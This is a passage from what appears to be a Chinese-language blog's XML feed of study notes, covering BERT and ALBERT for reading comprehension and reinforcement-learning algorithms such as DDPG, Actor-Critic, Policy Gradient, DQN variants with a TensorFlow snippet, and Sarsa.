prediction”任务来捕获句子之间的关系，此外用预训练（pre-train）加微调（fine-tune）的方式增强模型的泛化能力。 预训练+微调 预训练+微调就是先对模型的上层结构进行参数的预训练，然后根据任务的不同改变网络的下层结构，并对上层参数进行微调，这样可以使得模型的泛化能力更强，并且训练所需要的时间也得到了缩减。 在将预训练好的语言表达应用到下流任务有两种策略：(1) 基于特征的方法，即在处理不同的任务时，将预训练得到的表达作为附加特征 (2) 微调的方法，只引入少量需要从头开始训练的参数，其他参数只需要在预训练模型的基础上简单微调。 遮蔽语言模型 对于字符（token）级的任务来说，以上两种方式都限制了模型充分的结合上下文信息。同时 BERT 的参数非常多，所以需要大量的训练数据，为了解决该问题，BERT 使用了遮蔽语言模型（masked language model, MLM）。这种模型收到了完形填空的启发，它会随机的遮蔽输入中的某些 token，并让模型根据上下文去预测被遮蔽的 token 是什么。这使得表达能够混合上下文信息并且可以充分地利用无监督（自监督）的数据来进行训练。 但是 MLM 又带来了两个问题，一是造成了预训练和微调过程的不匹配，因为 [mask] 标志在微调过程中并不存在（预训练过程使用的是mask过的无监督数据，而微调过程使用的是有监督的真实数据），为了解决该问题，并不总是真的用 [mask] 标记来替换被选择的单词，而是在一定概率下不替换或者换成其他随机选取的单词。第二个问题是因为只有部分数据（而不是全部的数据）被标记为 [mask] 并需要预测，所以需要更多的训练时间（需要更多的batch来训练），但是这与所带来的效果相比是值得的。 预测下一个句子 另外某些任务是基于对两个句子之间关系的理解的，但是这并不能由语言模型直接捕获。这可以用“预测下一个句子（NSP）”的任务来解决，输入的两个句子 A 和 B，B 有一半的几率是 A 的下一句，另一半的几率是随机的句子。用模型来预测 B 是不是 A 的下一句话，从而让模型能够捕获句子之间的关系。 BERT 模型提出后，在11种文本挖掘任务中取得了当时最好的结果，并且对之前的最好的模型有很大的提升，被广泛认为是一个具有里程碑意义的模型。 5. ALBERTALBERT 是 A Lite BERT 的缩写，是一个轻量级的 BERT 模型，到目前为止（2019.11.8），它在 SQuAD2.0 数据集上达到了最好的效果。其最大的特点是参数少、速度快。 ALBERT 结合了两种参数约简(parameter reduction)技术： 第一个技术是对嵌入参数进行因式分解(factorized embedding parameterization)。通过将大的词汇表嵌入矩阵分解为两个小的矩阵，将隐藏层的大小与词汇表嵌入的大小分离开来。这种分离使得在不显著增加词汇表嵌入的参数大小的情况下，更容易增加隐藏层大小。 第二种技术是跨层参数共享(cross-layer parameter sharing)。这种技术可以防止参数随着网络深度的增加而增加。 下图是 BERT 和 ALBERT 模型参数的对比： 由于 BERT 中基于 NSP 任务的损失效果并不好，所以 ALBERT 还引入了基于预测句子顺序（sentence-order prediction, SOP）的预训练损失，SOP 主要聚焦在句子的句内连贯性。 三、机器阅读理解的研究趋势1. 基于外部知识的机器阅读理解在人类阅读理解过程中，当有些问题不能根据给定文本进行回答时，人们会利用常识或积累的背景知识进行作答，而在机器阅读理解任务中却没有很好的利用外部知识。 其挑战有：(1) 相关外部知识的检索 (2) 外部知识的融合 2. 带有不能回答的问题的机器阅读理解机器阅读理解任务有一个潜在的假设，即在给定文章中一定存在正确答案，但这与实际应用不符，有些问题机器可能无法进行准确的回答。这就要求机器判断问题仅根据给定文章能否进行作答，如若不能，将其标记为不能回答，并停止作答；反之，则给出答案。 其挑战有：(1) 不能回答的问题的判别 (2) 干扰答案的识别 3. 多条文档机器阅读理解在机器阅读理解任务中，题目都是根据相应的文章进行设计的。而人们在进行问答时，通常先提出一个问题，再利用相关的可用资源获取回答问题所需的线索。不再仅仅给定一篇文章，而是要求机器根据多篇文章对问题进行作答。 其挑战有：(1) 相关文档的检索 (2) 噪声文档的干扰 (3) 检索得到的文档中没有答案 (4) 可能存在多个答案 (5) 需要对多条线索进行聚合 4. 对话式阅读理解当给定一篇文章时，提问者先提出一个问题，回答者给出答案，之后提问者再在回答的基础上提出另一个相关的问题，多轮问答对话可以看作是上述过程迭代进行多次。 其挑战有：(1) 对话历史信息的利用 (2) 指代消解 参考文献[1] Shanshan Liu et al. Neural Machine Reading Comprehension: Methods and Trends. Applied Sciences 2019 [2] Tian Tian et al. Teaching Machines to Read and Comprehend. NIPS 2015 [3] Shuohang Wang et al. Machine Comprehension Using Match-LSTM and Answer Pointer. ICLR 2016 [4] Minjoon Seo et al. Bidirectional Attention Flow for Machine Comprehension. ICLR 2017 [5] Adams Wei Yu et al. QANet: Combining Local Convolution with Global Self-Attention for Reading Comprehension. ICLR 2018 [6] Ashish Vaswani et al. Attention Is All You Need. NIPS 2017 [7] Jacob Devlin et al. BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. NAACL. 2019 [8] Zhenzhogn Lan et al. ALBERT: A Lite BERT for Self-supervised Learning of Language Representations. arXiv 2019 [9] Danqi Chen. Neural Reading Comprehension and Beyond. StanfordUniversity. 2018]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（7）：深度确定性策略梯度（Deep Deterministic Policy Gradient, DDPG）]]></title>
    <url>%2F2019%2F10%2F28%2FDDPG%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 DDPG 算法的有关内容。 一、DDPG 算法DDPG 是 Deep Deterministic Policy Gradient 的缩写，其中深度 （Deep） 代表 DQN；确定性（Deterministic）是指不再先生成各个动作的概率然后再选择概率最高的动作，而是直接输出一个确定性的动作；Policy Gradient 就不用解释了吧。 因为在 Actor-Critic 中连续状态中前后状态具有相关性，所以会导致神经网络只能片面的看待问题，甚至导致神经网络学不到东西、收敛慢。为了解决这个问题，DDPG 使用了类似于 DQN 的经验回放池。在实操中，一开始时先由 Actor 随机的采取动作，当经验回放池存储满后，再从里面随机选择 batch 个样本进行网络参数更新。 DDPG 可以看作是 Actor-Critic 算法和 DQN 算法的结合，该算法中还是有 Actor 和 Critic 两个网络。与 Actor-Critic 算法不同的是 Actor 网络直接采用 Critic 网络对自己动作的评估值 TD-error 作为 Actor 网络的损失函数。而两者的 Critic 网络的损失函数是相同的。 因为 DDPG 还结合 DQN 算法，所以 Actor 和 Critic 网络又分别有两个—— target 网络和 eval 网络。与 DQN 一样，eval 网络的参数保持最新，而 target 网络的参数隔一段时间后才会更新。 总结一下，Actor-target 网络和 Critic-target 网络是一对，前者做动作，后者对动作进行评估，然后前者再根据评估值改变自己选择动作的概率。同理 Actor-eval 网络和 Critic-eval 网络是一对，前者做动作，后者对动作进行评估，不同的是，前者没有自己的损失函数，而是靠 Actor-target 来更新自己的参数。而 Actor-target 网络和 Actor-eval 网络是一对，它们的存在是为了打乱观测值前后的相关性。同理 Critic-target 和 Critic-eval 这两个网络也是如此。 由于 Actor-Critic 算法中是先 Critic 更新参数然后再 Actor 更新参数，而 DDPG 与之相反，这使得 DDPG 中获得两个网络的输出和更新两个网络的参数这两个阶段是分离的（先同时得到两个网络的输出，再更新两个网络的参数）。所以说 DDPG 的网络结构写起来是比较蛋疼的，具体情况建议大家根据代码自己理顺两个网络中数据的传递流程。 二、DDPG 中的 Tricks（1）soft-replacement在把 eval 网络的参数赋值给 target 网络时，不再是 hard replacement，而是软替换 soft replacement，这样可以避免不收敛的问题。hard replacement 就是每隔一定的步数就将 eval 网络中的参数赋值给 target 网络，而 soft replacement 就是每一步都对 target 网络的参数更新一部分。 (2) 为 action 增加噪声这样可以增加网络的鲁棒性。 三、DDPG 算法流程]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（6）：Actor-Critic（演员评论家）算法]]></title>
    <url>%2F2019%2F10%2F21%2FAC%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 Actor-Critic 算法的有关知识。 一、Actor Critic 算法Actor-Critic 算法合并了以策略为基础的 Policy Gradient和以值为基础的 Q-Learning 两类强化学习算法，该算法中将前者当作 Actor，用来基于概率选择行为。将后者当作 Critic，用来评判 Actor 的行为得分，然后 Actor 又会根据 Critic 的评分修改行为的概率。这使得它既可以在有效的处理连续动作的选取，又可以进行单步更新（PG算法的回合更新降低了学习效率）。 下面分别介绍一下 Actor 网络和 Critic 网络这个两个部分。 二、Actor 网络Actor 网络采用的是基于策略的 Policy-Gradient 算法。PG 算法的损失函数可以表示为：$loss=-E[\log{[\pi(a|s)]}\cdot \psi]$，其中 $\psi$ 是对某个轨迹的评分， 在 AC 算法中它可以有多种表示方式： 状态价值函数：V(s) 动作价值函数：Q(s,a) TD-error：$r+\gamma\cdot Q(s_{t+1},a_{t+1})-Q(s_t,a_t)$ 优势函数：V(s,a) 总回报：$\sum r_t$ 加入基线的总回报：$\sum r_t-b$ 在实际编写代码的时候，使用的是 TD-error 来作为评价，同时为了鼓励探索（exploration），所以损失函数中还加入了交叉熵损失。 三、Critic 网络Critic 网络采用的是基于值函数的 Q-Learning 算法，采用的是 $loss=(TD_{error})^2$ 作为 Critic 网络的损失函数。 整个 Actor Critic 算法可以用下图表示： 四、AC 算法的缺点AC 取决于 Critic 的价值判断, 但是 Critic 难收敛, 再加上 Actor 的更新, 就更难收敛，为了解决该问题又提出了 DDPG 算法和 A3C 算法。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（5）：策略梯度（Policy Gradient, PG）算法]]></title>
    <url>%2F2019%2F10%2F13%2FPG%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 Policy Gradient（PG）算法的相关内容。 之前提到的 Sarsa、Q-Learning 和 DQN 算法都是基于价值的方法，也就是先计算每个状态对应的动作的 Q 值，再选择 Q 值最大的动作执行。而 Policy Gradient 是一种更加直接的方式，它直接计算每个状态对应的动作或者动作的概率。这样做的优点就是它可以在一个连续区间内选取动作。 Policy Gradient 算法就是对策略函数进行建模，然后用梯度下降更新网络的参数。但是在强化学习中并没有实际的损失函数，而 PG 算法的目的是最大化累计奖励的期望值，所以可以将损失函数设为：$loss=-E[\log{[\pi(a|s)]}\cdot Q(s,a)]$，可以理解为如果一个动作的奖励值较大，则下次选取该动作的可能性增加的幅度也大，反之选取该动作的可能性增加的幅度小。 但是因为策略 $\pi$ 不易求得，所以可以将其改写为 $loss=-E[\log[p_\theta(\tau)]\cdot R(\tau)]$，其中 $p_\theta(\tau)$ 是轨迹 $\tau$ 出现的概率，$R(\tau)$ 是轨迹 $\tau$ 的总奖励值。因此，策略梯度的直观含义是增大高回报轨迹的概率，降低低回报轨迹的概率。 而取对数的原因是取对数后不会改变函数的单挑性，又会避免指数的计算（如果有的话），同时可以将乘法转化为加法，既降低了计算复杂度，又避免了多个小于 1 的数相乘导致下溢出的情况。 根据采样方式的不同可以分为两种情况，第一种是基于蒙特卡洛的方式，此时会采一个回合（episode）的样本然后计算 loss；第二种是基于 TD 的方式，此时会采单步的样本然后计算 loss。前一种的代表是 REINFORCE 算法，后一种的代表是 Actor-Critic 算法。 以上是关于 PG 算法的一些感性认识和拼凑起来的总结，下面将从理性的角度以数学公式推理的形式推导一下 PG 算法的损失函数。以下内容主要是根据李宏毅老师的 RL 教程整理的。 轨迹：$\tau={s_1,a_1,s_2,a_2,…,s_T,a_T}$，则该轨迹出现的概率为：$$p_\theta(\tau)=p(s_1)p_\theta(a_1|s_1)p(s_2|s_1,a_1)p_\theta(a_2|s_2)p(s_3|s_2,a_2)…$$ $$=p(s_1)\prod_{t=1}^Tp_\theta(a_t|s_t)p(s_{t+1}|s_t,a_t)\quad\quad\quad 公式(1)$$ 在上式中，因为在给定状态 $s_t$ 确定要采取什么动作 $a_t$ 时，需要神经网络来完成，所以 $p_\theta(a_t|s_t)$ 带参数 $\theta$，相反，$p(s_{t+1}|s_t,a_t)$ 是由环境决定的，所以不带参数 $\theta$。 每一个动作 $a_t$ 获得相应的奖励 $r_t$，则总奖励为 $ R(\tau)=\sum_{t=1}^Tr_t$，我们希望总奖励最大化。 奖励的期望为：$\bar R_\theta=\sum_\tau R(\tau)p_\theta(\tau)=E_{\tau-p_\theta(\tau)}[R(\tau)]$，即奖励的期望为所有轨迹出现的概率与该轨迹奖励值乘积之和。 因为我们要求的是使得总奖励值 $\bar R_\theta$ 最大的最优策略 $\pi$，所以损失函数可以设为：$$L(\theta)=-\bar R_\theta$$损失函数（负的奖励的期望）对参数 $\theta$ 求导：$$\nabla L(\theta)=-\nabla \bar R_\theta=-\sum_\tau R(\tau)\nabla p_\theta(\tau)=-\sum_\tau R(\tau)p_\theta(\tau)\frac{\nabla p_\theta(\tau)}{p_\theta(\tau)}$$因为 $\nabla f(x)=f(x)\nabla\log f(x)$，所以：$$=-\sum_\tau R(\tau)p_\theta(\tau)\nabla\log p_\theta(\tau)$$将 $p_\theta(\tau)$ 看作是 $R(\tau)\nabla\log p_\theta(\tau)$ 的概率分布，则可改写为期望的形式：$$=-E_{\tau\sim p_\theta(\tau)}[R(\tau)\nabla\log p_\theta(\tau)]\thickapprox -\frac{1}{N}\sum_{n=1}^N R(\tau^n)\nabla\log p_\theta(\tau^n)$$上式中由于前一项没法直接结算，所以可以通过采样的方式获取多个轨迹 $\tau$ 来计算，其中 N 是轨迹的个数，$\tau^n$ 表示是第 n 个轨迹。 如公式(1) 所示，轨迹的概率 $p_\theta(\tau^n)$ 的表达式中的 $p(s_{t+1}|s_t,a_t)$ 来自环境，而 $p_\theta(a_t|s_t)$ 来自决策网络，前者是不带参数 $\theta$ 的，对其求导没什么用。所以 $p_\theta(\tau^n)$ 可以写作 $p_\theta(\tau^n)=p_\theta(a_1^n|s_1^n)\cdot p_\theta(a_2^n|s_2^n)\cdot …\cdot p_\theta(a_{T_n}^n|s_{T_n}^n)$，对其取对数后变为求和的形式，即：$$=-\frac{1}{N}\sum_{n=1}^N\sum_{t=1}^{T_n} R(\tau^n)\nabla\log p_\theta(a_t^n|s_t^n)$$ 其中 $T_n$ 是第 n 个轨迹的长度。然后更新模型参数：$$\theta=\theta-\eta\cdot\nabla L(\theta)$$其中 $\eta$ 是学习率。 Tip1：增加基准 由于采取的行动概率和为一，可能存在归一化之后，好的 action 的概率相对下降，坏的 action 概率相对上升的情况，因此需要引入一个基准线 b，让 $\nabla\bar R_\theta$ 变得有正有负，将其改写为：$$\nabla\bar R_\theta\approx\frac{1}{N}\sum_{n=1}^N\sum_{t=1}^{T_n}(R(\tau^n)-b)\nabla\log p_\theta(a_t^n|s_t^n)$$ $$b\approx E[R(\tau)]$$ Tip2：设置适当的置信度$$\nabla\bar R_\theta\approx\frac{1}{N}\sum_{n=1}^N\sum_{t=1}^{T_n}(\sum_{t’=t}^{T_n}{\gamma^{t’-t}\cdot r_{t’}^n}-b)\nabla\log p_\theta(a_t^n|s_t^n)$$用 $\sum_{t’=t}^{T_n}{\gamma^{t’-t}\cdot r_{t’}^n}$ 代替了 $R(\tau^n)$，将从当前状态以后产生的回报作为当前状态的奖励值。$\gamma&lt;1$ 表示折扣系数，一个状态离当前状态越远损失越大，即与当前越不相关。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（4）：Double DQN、Prioritized Experience Replay DQN和Dueling DQN]]></title>
    <url>%2F2019%2F10%2F11%2FDQN-improve%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关Double DQN算法、Prioritized Experience Replay DQN 算法和 Dueling DQN 算法的相关内容。 对于 DQN 算法的改进主要有三种——Double DQN算法、Prioritized Experience Replay DQN 算法和 Dueling DQN 算法。 一、Double DQN传统 DQN 中的 Q-target 部分如下：$$Y_t^{DQN}=R_{t+1}+\gamma\max_aQ(S_{t+1},a;\theta_t^-)$$$\theta^-$ 表示旧的神经网络参数。因为在选择行为 a 和得到对应的 Q 值时使用的是同一张 Q 表，而神经网络总是倾向于选择被高估的动作，可能导致估计值过大，过于乐观。所以可以引入另一个神经网络来减小误差的影响。而 DQN 中本来就有两个神经网络，所以可以用估值网络来估计 Q-target 中 max Q 中动作的最大值。$$Y_t^{DoubleDQN}=R_{t+1}+\gamma Q(S_{t+1},\arg\max_aQ(S_{t+1},a;\theta_t);\theta_t^-)$$在实操时，它首先使用估值网络计算下一个状态 $S_{t+1}$ 的对应各个 Action 的 Q 值，然后选取最大的那个 Q 值对应 Action 的索引，再使用目标网络选取估值网络中给定Action 索引对应的 Q 值。即用一张 Q 表来选择具有最大值的行动 a，再用另一张 Q 表来计算 $Q(S_{t+1},a)$ 的最大值。 Double DQN 走迷宫例子 莫烦大神的 Double DQN 只给了一个基于 gym 的例子，一开始我以为 gym 不支持 windows（目前已经部分支持了），于是就还是以走迷宫为例，自己实现了一下，下面说下碰到的几个坑。 下面只给出在 build_net 函数中的关键语句，完整的代码可以见我的 github。 123456789101112131415161718192021with tf.variable_scope("eval_net"): # 估值网络 e1 = tf.layers.dense(self.s, 20, tf.nn.relu, kernel_initializer=w_initializer, bias_initializer=b_initializer, name="e1") # 第1层 self.q_eval = tf.layers.dense(e1, self.n_actions, kernel_initializer=w_initializer, bias_initializer=b_initializer, name="e2") # 第二层 # Q估计中每个状态的动作值最大的下标 action_index = tf.argmax(self.q_eval,axis=1,output_type = tf.int32) with tf.variable_scope("q_target"): # 下面的语句不可换为：self.q_next.shape[0]，因为该语句是静态获取shape row=tf.range(tf.shape(self.q_next)[0]) pos = tf.stack([row,action_index],axis=1) ''' tf.gather(data,indices,axis): 在data张量的axis对应的轴中，按照下标数组 indices选取元素。 tf.gather_nd(data,indices): 在data张量中，按照下标数组indices选取元素， 其中indices是data的前几个维度。 ''' val = tf.gather_nd(params=self.q_next,indices=pos) q_target = self.r + self.gamma * val # Q 现实 self.q_target = tf.stop_gradient(q_target) # 对 q_target的反向传播进行截断 其实思想很简单，就是找到估值网络中每个状态的动作最大值对应的下标，然后在计算 Q-target 时使用以上得到的下标。但是由于 TensorFlow 是静态定义计算图，然后再喂进数据动态进行计算的， 所以在喂数据之前张量的大小是不确定的，张量的值也是不知道的。直接使用得到的下标会出错，需要全部改成动态的过程。比如我之前是用以下方式写的，程序会报错。 1q_target = self.r + self.gamma * self.q_next[row,action_index] 二、Prioritized Replay DQN当正负奖励的样本不均衡时，需要重视那种比较少量但是值得学习的样本。所以在取一个 batch 的样本时不再采用随机采样，而是按照所有样本的优先级来采样。所谓一个样本就是一个 $(s,a,r,s’)$ 。 样本的优先级定义为 $Q_{target} - Q_{evalue}$，即两者之间的差异大小，也就是 TD-error。该值越大则说明预测的精度有比较大的上升空间，这个样本就越需要被学习，优先级越高。 假设有 4 个样本，其优先级分别为 3，10，12，4；每个样本所占的区间长度为其优先级大小，即第一个样本的区间为 (0 , 3)，第二个样本为 (3 , 13)，第三个为 (13 , 25)，第四个为 (25 , 29)。那么可以在 (0 , 29) 的范围内随机生成一个整数，这个整数处于哪个样本对应的区间内，则对哪个样本进行采样。这样优先级高的样本被采样到的概率也高。为了实现动态地按优先级采样，又提出了 SumTree 的结构。 SumTree 是一棵完全二叉树，如下图所示，它的每个叶节点对应一个样本，圆圈内的数字是样本的优先级，叶子节点下方的数是该样本所占的区间范围。内部节点的值是其儿子节点优先级值的和。 那么怎么利用 SumTree 进行搜索呢？假设优先级之和（根节点中的数字）为 sum，则在 (0 , sum) 的区间内随机生成一个整数 A，从根节点开始，不断与当前节点的 左儿子 对应的数值比较，若 A 小于该数值，则在当前节点的左子树中搜索；反之在右子树中搜索，同时将数值 A 更新为 $A=A-当前节点左儿子的值$。重复搜索过程直到到达叶子节点，则搜索结果落在哪个区间内，该区间对应的样本将会被采样。 举个例子，在上图中，由于优先级之和为 42，那么可以在 (0 , 42) 的范围内随机生成一个整数，比如生成的数是 24，那么从根节点开始 24 先于根节点的左儿子对应的数值 29 比较，明显 24&lt;29，应该在根节点的左子树中搜索，然后再与值为 29 的节点的左儿子 13 比较，因为 24&gt;13，所以应该在右子树中搜索，同时将搜索值更新为 $24-13=11$，不断搜索，最终落在第 3 个叶子节点对应的样本中，于是将对该样本进行采样。 上面是对一个样本根据优先级进行随机采样，如果是采样 n 个样本呢？可以先将总优先级平均分为 n 个区间，然后在每个区间各产生一个随机数，再进行上述采样。 在更新时，不仅要更新样本的值，而且要更新 SumTree 中该样本以及该样本的祖先节点的优先级。因为 SumTree 是一棵完全二叉树，所以可以用数组表示 SumTree，如果一个节点的下标为 i，则其左右儿子节点的下标分别为 $2\times i$ 和 $2\times i +1$，这样要寻找一个节点的祖先节点就比较方便了。另外还需要一个数组来存储样本的值。 最后来思考一个问题，numpy 中提供了一个 np.random.choice() 函数，这个函数也可以实现按照概率从数组中随机取数，那么为什么不直接用它呢？原因很简单，这个函数的复杂度太高了，不过我没有在网上找到它的复杂度到底是多少，有知道小伙伴还请告知。 因为使用优先级采样的方式改变了样本的分布，所以会产生误差，为了消除偏差，使用了重要性采样（Importance Sampling）的方法，也就是让原来的损失函数变为：$$L(\theta)=E[ISWeights\times(Q_target-Q_evalue)^2]$$ISWeights 就是下面会提到的重要性权重。 Importance sampling（重要性采样）：$$E_{x\sim p}[f(x)]=\int f(x)p(x)dx=\int f(x)\frac{p(x)}{q(x)}q(x)dx=E_{x\sim q}[f(x)\frac{p(x)}{q(x)}]$$当只能从 q(x) 分布得到样本时，可以做以上变换来计算 p(x) 分布的期望，其中 $\frac{p(x)}{q(x)}$ 被称为重要性权重。 重要性采样的一个问题就是：两个分布之间的差别不能太大，否则方差会出现较大差别。 方差公式：$$Var[x]=E[x^2]-(E[x])^2$$上面已经推出两个分布的期望相等：$$E_{x\sim p}[f(x)]=E_{x\sim q}[f(x)\frac{p(x)}{q(x)}]$$两个分布的方差：$$Var_{x\sim p}[f(x)]=E_{x\sim p}[f(x)^2]-(E_{x\sim p}[f(x)])^2$$ $$Var_{x\sim q}[f(x)\frac{p(x)}{q(x)}]=E_{x\sim q}[(f(x)\frac{p(x)}{q(x)})^2]-(E_{x\sim q}[f(x)\frac{p(x)}{q(x)}])^2$$ $$=E_{x\sim p}[(f(x)^2\frac{p(x)}{q(x)})]-(E_{x\sim p}[f(x)])^2$$ 这样就得到了两者方差之间的关系。最后一个等式成立的原因是分布 q 和 p 的期望相等，并且因为：$$E_{x\sim q}[(f(x)\frac{p(x)}{q(x)})^2]=\int f^2(x)\frac{p^2(x)}{q^2(x)}\cdot q(x)dx=\int f^2(x)\frac{p^2(x)}{q(x)}dx$$ $$=\int f^2(x)\frac{p(x)}{q(x)}\cdot p(x)dx=E_{x\sim p}[(f(x)^2\frac{p(x)}{q(x)})]$$ 根据重要性采样的思想（$E_{x\sim p}[f(x)]=E_{x\sim q}[f(x)\frac{p(x)}{q(x)}]$），将 on-policy 变为 off-policy：$$\nabla \bar R_\theta=E_{\tau\sim p_\theta(\tau)}[R(\tau)\nabla\log p_\theta(\tau)]=E_{\tau\sim p_\theta’(\tau)}[\frac{p_\theta(\tau)}{p_\theta’(\tau)}R(\tau)\nabla\log p_\theta(\tau)]$$ 三、Dueling DQN 在普通的 DQN 中，在某些状态下值函数的大小与动作无关，所以 Dueling DQN 将Q网络分成两部分。第一部分仅与状态 S 有关，与具体要采用的动作 A 无关，这部分我们叫做 价值函数 部分，记做 $V(S,w,\alpha)$ 。第二部分同时与状态 S 和动作 A 有关，这部分叫做 优势函数 （Advantage Function）部分，记为 $A(S,A,w,\beta)$。V 表示静态的状态环境本身具有的价值，而 A 表示选择某个 action 带来的额外价值。 那么最终的 Q 函数可以重新表示为：$$Q(S,A,w,\alpha,\beta)=V(S,w,\alpha)+A(S,A,w,\beta)$$其中，$w$ 是公共部分的网络参数，而 $\alpha$ 是价值函数独有部分的网络参数，而 $\beta$ 是优势函数独有部分的网络参数。 我们可以直接使用上面的价值函数的组合公式得到我们的动作价值，但是这个式子无法辨识最终输出里面 $V(S,w,\alpha)$ 和 $A(S,A,w,\beta)$ 各自的作用。也就是说当 Q 值一定时，V 和 A 的值可能有多种情况。为了可以体现这种可辨识性（identifiability），实际使用的组合公式如下：$$Q(S,A,w,\alpha,\beta)=V(S,w,\alpha)+[A(S,A,w,\beta)−\frac{1}{|A|}\sum_{a′\in A}A(S,a′,w,\beta)]$$其实就是对优势函数部分做了中心化的处理。 减去同一状态下动作值的平均值做法的另一种解释是，网络在训练时可能为了简单而直接让 Q=A，也就是让 V=0，为了避免这个情况的发生，于是加入了该限制。这样 A 同一状态下动作值之和为 0，而 V 同一状态下动作值为 Q 同一状态下动作值的均值，两者都不可能全为 0 了。 四、其他优化方法1. Noisy DQN$\epsilon-greedy$ 是对每一个动作加噪声，而 Noisy DQN 是对每一个回合的 Q-function 的参数加噪声，也就是说每个回合中 Q-function 的参数不会边。相较而言后者的方式比较好。 2. Distributional DQNQ(s,a) 是累计收益的期望值，也就是价值函数的均值，但是不同的分布得到的均值可能相同，所以 Distributional DQN 认为可以输出 Q 值的分布，当具有相同的均值时，选择具有较小方差（风险）的那个。但是实际上这个方法难以实现。 3. RainBow RainBow 这个版本的 DQN 是结合了上述多种不同的对 DQN 的优化方法得到的，提升还是蛮大的。作者在论文里对比了各种方法的得分（如左图所示），还对比了 RainBow 分别去掉一个优化的方法后的得分（如右图所示）。 五、总结在 Double DQN 中，我们通过优化目标 Q 值的计算来优化算法；在 Prioritized Replay DQN 中，我们通过优化经验回放池按优先级采样来优化算法；而在 Dueling DQN 中，我们通过优化神经网络的结构来优化算法。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（3）：Deep Q Network（DQN）算法]]></title>
    <url>%2F2019%2F10%2F10%2FDQN%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 Deep Q Network（DQN）算法的相关内容。 1. DQN 的基本思想传统的 Q-Learning 算法当 Q 表过大时不仅难以存储而且难以搜索，并且当状态是连续的话，用 Q 表存储是不现实的，这时可以用一个函数来拟合 Q 表，所以提出了神经网络和 Q-Learning 相融合的 Deep Q-Learning（DQN）算法，其中神经网络用来代替 Q 表，以获得状态和动作对应的 Q 值。 在 DQN 中将状态和动作作为神经网络的输入值，并得到相应的输出——对应的 Q 值 。也可以只输入状态，输出所有的动作值，然后挑选值最大的动作作为下一步要采取的动作。 在对 NN 进行训练时，需要设置损失函数，但是在该问题中又是没有标签数据的。可以将损失函数设为：$$L(\theta)=E[(Q_{target}-Q_{evalue})^2]$$Q-target 和 Q-eval 就是 Q-Learning 算法中的对应值。该损失函数和 Q-Learning 算法中 Q 表更新公式的含义相同，都是用 Q-eval 逼近 Q-target。 2. DQN 的两大神器（1）Experience replay（经验回放）：NN 的训练样本独立，而 RL 中的前后状态相关，所以需要做一点改动。因为 Q-Learning 是一个离线学习算法，所以在每次 DQN 更新时，可以随机选取一些过去的状态来进行学习。这种方式打乱了状态之间的相关性，可以使神经网络更有效率。 （2）Fixed Q-target（固定 Q-目标）：因为网络会不断的更新，所以相同 s 和 a 下的 Q-target 和 Q-eval 的值是不固定的，这样训练起来比较困难。所以可以将 Q-target 固定住，这样目标问题就变成了一个回归问题：用 Q-eval 去逼近 Q-target。 具体实现时，在 DQN 中使用两个结构相同但是参数不同的 NN，预测 Q-eval 的估值网络具有最新的参数，而预测 Q-target 的目标网络的参数则是之前的，隔一段时间才会更新参数（将估值网络的参数赋给目标网络）。 这种方式降低了 Q-target 和 Q-eval 之间的相关性。 3. DQN 算法流程]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（2）：Sarsa 算法及 Sarsa(lambda) 算法]]></title>
    <url>%2F2019%2F10%2F10%2Fsarsa%2F</url>
    <content type="text"><![CDATA[本文主要讲解 Sarsa 算法以及 Sarsa($\lambda$) 算法的相关内容，同时还会分别附上一个莫烦大神写的例子。 一、Sarsa 算法Sarsa 算法与 Q-Learning 算法相似，也是利用 Q 表来选择动作，唯一不同的是两者 Q 表的更新策略不同。该算法由于更新一次动作值函数需要用到 5 个量 $(s,a,r,s′,a′)$，所以被称为 Sarsa 算法。 1. Sarsa 算法基本思想Sarsa 算法中 Q 表的更新公式如下：$$Q(S_t,A_t)\leftarrow Q(S_t,A_t)+\alpha[R_{t+1}+\gamma\cdot Q(S_{t+1},A_{t+1})-Q(S_t,A_t)]$$其中 $Q(S_{t+1},A_{t+1})$ 是下一时刻的状态和实际采取的行动对应的 Q 值；而在 Q-Larning 中是下一时刻的状态对应的 Q 值的最大值，但是在实际中可能不采用该最大值对应的动作。Sarsa 算法和 Q-Learning 算法除了在 Q-target 上有所不同，其他的都一样。 Sarsa 是 on-policy 学习方法，因为它始终只有一个策略，使用 $\epsilon$ 贪婪方法选择出 $Q(S_t,A_t)$ 和 $Q(S_{t+1}’,A_{t+1}’)$ 。而 Q-Learning 算法是 off-policy 算法，选择 $Q(S_t,A_t)$ 时使用 $\epsilon$ 贪婪方法，而计算 $Q(S’,A’)$ 时使用了最大值算法，学习和行动分别采用了两套不同的策略。 2. Sarsa 算法流程： 初始化 Q 表（令其值为 0） 对于每个 episode（回合）： ​ 1. 初始化状态 s ​ 2. 在当前状态 s 的所有可能动作中选取一个动作 a （以 $\epsilon$ 的概率安装 Q 表数值最大的动作行动，以 $1-\epsilon$ 的概率随机行动） ​ 3. 如果当前状态 s 不是终止状态，则重复执行以下步骤： ​ （1）执行动作 a 并得到下一个状态 s‘ 和相应的奖励 r ​ （2）在当前状态 s’ 的所有可能动作中选取一个动作 a’ ​ （3）更新 Q 表：$Q(s,a)\leftarrow Q(s,a)+\alpha[r+\gamma\cdot Q(s’,a’)-Q(s,a)]$ ​ （4）更新状态和动作：s=s’， a=a’ 二、 Sarsa ($\lambda$) 算法1. Sarsa ($\lambda$) 算法基本思想Q-Learning 和 Sarsa 都是在得到奖励后只更新上一步状态和动作对应的 Q 表值，是单步更新算法，也就是 Sarsa(0)。但是在得到当前奖励值之前所走的每一步（即一个轨迹）都多多少少和最终得到的奖励值有关，所以不应该只更新上一步状态对应的 Q 值。于是就有了多步更新算法——Sarsa(n)。当 n 